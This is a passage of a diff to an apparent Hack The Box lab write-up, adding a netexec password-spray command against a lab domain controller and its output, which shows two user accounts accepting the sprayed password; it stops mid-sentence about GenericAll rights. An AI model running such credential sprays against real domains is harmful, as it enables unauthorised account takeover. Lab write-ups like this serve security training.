@@ -306,8 +306,29 @@ However using kerberos auth fails on both which is usually a bypass for protecte
 # Password spray leads to user compromise
 
 ```python
-
+nxc smb dc01.infiltrator.htb -u users.txt -p 'WAT?watismypass!' --continue-on-success -k
+SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\Administrator:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\Guest:WAT?watismypass! KDC_ERR_CLIENT_REVOKED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\krbtgt:WAT?watismypass! KDC_ERR_CLIENT_REVOKED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\DC01$:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\D.anderson:WAT?watismypass! 
+SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\L.clark:WAT?watismypass! 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\M.harris:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\O.martinez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\A.walker:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\K.turner:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\E.rodriguez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\winrm_svc:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\infiltrator_svc$:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\lan_managment:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
 ```
+
+This has compromised the user `d.anderson`
+
+![](Pasted%20image%2020261004175447.png)
+
+This user has GenericAll on the 
 
 
 
